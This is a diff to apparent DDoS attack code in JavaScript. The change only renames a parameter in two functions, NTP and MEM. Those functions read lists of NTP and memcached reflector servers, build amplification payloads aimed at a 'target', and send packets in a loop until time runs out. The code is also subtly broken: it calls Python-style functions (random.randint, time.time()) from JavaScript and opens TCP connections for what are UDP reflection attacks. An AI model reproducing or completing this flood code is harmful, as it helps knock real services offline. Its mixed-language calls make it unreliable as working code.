@@ -135,13 +135,13 @@ async function bootup() {
 const ntp_payload = "\x17\x00\x03\x2a" + "\x00".repeat(4);
 const mem_payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n";
 
-function NTP(target, port, timer) {
+function NTP(target, port, duration) {
   try {
     const ntp_servers = fs.readFileSync('ntpServers.txt', 'utf8').split('\n');
     const packets = random.randint(10, 150);
     const server = random.choice(ntp_servers).trim();
 
-    while (time.time() < timer) {
+    while (time.time() < duration) {
       try {
         const packet = Buffer.from(`${ntp_payload}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00`);
         const client = net.createConnection({ port: port, host: server });
@@ -160,13 +160,13 @@ function NTP(target, port, timer) {
   }
 }
 
-function MEM(target, port, timer) {
+function MEM(target, port, duration) {
   try {
     const memsv = fs.readFileSync('memsv.txt', 'utf8').split('\n');
     const packets = random.randint(1024, 60000);
     const server = random.choice(memsv).trim();
 
-    while (time.time() < timer) {
+    while (time.time() < duration) {
       try {
         const packet = Buffer.from(mem_payload);
         const client = net.createConnection({ port: 11211, host: server });
